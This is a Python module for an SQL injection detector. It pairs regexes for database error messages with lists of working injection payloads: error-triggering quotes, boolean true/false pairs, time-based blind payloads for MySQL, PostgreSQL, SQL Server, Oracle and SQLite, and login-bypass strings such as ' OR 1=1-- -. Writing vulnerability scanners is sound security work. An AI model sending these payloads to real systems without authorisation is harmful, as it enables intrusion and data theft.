"""
Database error signatures and injection payloads for the SQLi detector.

Error strings are taken from the DBMS drivers themselves; a response that
contains one after an injected quote is strong evidence of SQL injection.
"""

from __future__ import annotations

import re

# (dbms, compiled regex) — matched against response bodies.
DBMS_ERRORS: list[tuple[str, re.Pattern]] = [
    ("MySQL", re.compile(r"SQL syntax.*?MySQL|Warning.*?\bmysqli?_|MySqlException|"
                         r"valid MySQL result|check the manual that (corresponds|fits) to your (MySQL|MariaDB)|"
                         r"Unknown column '[^']+' in 'field list'|MySqlClient\.", re.I)),
    ("MariaDB", re.compile(r"MariaDB server version for the right syntax|org\.mariadb\.jdbc", re.I)),
    ("PostgreSQL", re.compile(r"PostgreSQL.*?ERROR|Warning.*?\bpg_|valid PostgreSQL result|Npgsql\.|"
                              r"PG::SyntaxError:|org\.postgresql\.util\.PSQLException|"
                              r"unterminated quoted string at or near", re.I)),
    ("Microsoft SQL Server", re.compile(r"Driver.*? SQL[\-\_\ ]*Server|OLE DB.*? SQL Server|\bSQL Server[^&]+Driver|"
                                        r"Warning.*?\b(mssql|sqlsrv)_|\bSQL Server[^&]+[0-9a-fA-F]{8}|"
                                        r"System\.Data\.SqlClient\.SqlException|Unclosed quotation mark after the "
                                        r"character string|'80040e14'|Incorrect syntax near", re.I)),
    ("Oracle", re.compile(r"\bORA-\d{5}|Oracle error|Oracle.*?Driver|Warning.*?\boci_|quoted string not properly "
                          r"terminated|SQL command not properly ended", re.I)),
    ("SQLite", re.compile(r"SQLite/JDBCDriver|SQLite\.Exception|System\.Data\.SQLite\.SQLiteException|"
                          r"Warning.*?\bsqlite_|\[SQLITE_ERROR\]|SQLite error \d+:|unrecognized token:|"
                          r"near \".+?\": syntax error", re.I)),
    ("IBM DB2", re.compile(r"CLI Driver.*?DB2|DB2 SQL error|\bdb2_\w+\(|SQLCODE[=:\s-]+\d", re.I)),
    ("Sybase", re.compile(r"Sybase message|Warning.*?\bsybase_|Sybase.*?Server message", re.I)),
    ("Generic", re.compile(r"Dynamic SQL Error|System\.Data\.OleDb\.OleDbException|java\.sql\.SQLException|"
                           r"SQLSTATE\[\w+\]|Unexpected end of command in statement", re.I)),
]

# A quote that is *not* reflected back verbatim — so a hit means the DB parsed it.
ERROR_PROBES = ["'", '"', "')", "';", "\\", "`"]

# Boolean pairs: (true-condition, false-condition). The true one should look
# like the original response, the false one should differ.
BOOLEAN_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1-- -", "' AND 1=2-- -"),
    ('" AND "1"="1', '" AND "1"="2'),
    (" AND 1=1", " AND 1=2"),
    (" AND 1=1-- -", " AND 1=2-- -"),
    (") AND ('1'='1", ") AND ('1'='2"),
]

# Time-based payloads per DBMS; {S} is replaced with the delay in seconds.
# Each entry: (dbms, true-payload-with-sleep, decoy-payload-no-sleep)
TIME_PAYLOADS = [
    ("MySQL", "' AND SLEEP({S})-- -", "' AND SLEEP(0)-- -"),
    ("MySQL", "'XOR(SELECT(0)FROM(SELECT(SLEEP({S})))a)XOR'Z", "'XOR(SELECT(0)FROM(SELECT(SLEEP(0)))a)XOR'Z"),
    ("MySQL", " AND SLEEP({S})", " AND SLEEP(0)"),
    ("PostgreSQL", "' AND (SELECT {S} FROM PG_SLEEP({S}))IS NOT NULL-- -", "' AND (SELECT 0 FROM PG_SLEEP(0))IS NOT NULL-- -"),
    ("PostgreSQL", ";SELECT PG_SLEEP({S})-- -", ";SELECT PG_SLEEP(0)-- -"),
    ("Microsoft SQL Server", "';WAITFOR DELAY '0:0:{S}'-- -", "';WAITFOR DELAY '0:0:0'-- -"),
    ("Microsoft SQL Server", " WAITFOR DELAY '0:0:{S}'", " WAITFOR DELAY '0:0:0'"),
    ("Oracle", "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{S})-- -", "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',0)-- -"),
    ("SQLite", "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({B}))))-- -", "' AND 1=2-- -"),
]

# Login/auth-bypass payloads tried in username (and password) fields.
AUTH_BYPASS = [
    "' OR '1'='1",
    "' OR '1'='1'-- -",
    "' OR 1=1-- -",
    "' OR 1=1#",
    '" OR "1"="1',
    '" OR 1=1-- -',
    "admin'-- -",
    "admin'#",
    "') OR ('1'='1",
    "' OR 1=1 LIMIT 1-- -",
    "' OR 'x'='x",
]


def match_dbms_error(body: str) -> str | None:
    """Return the DBMS name if the body contains a known SQL error, else None."""
    if not body:
        return None
    for dbms, pattern in DBMS_ERRORS:
        if pattern.search(body):
            return dbms
    return None
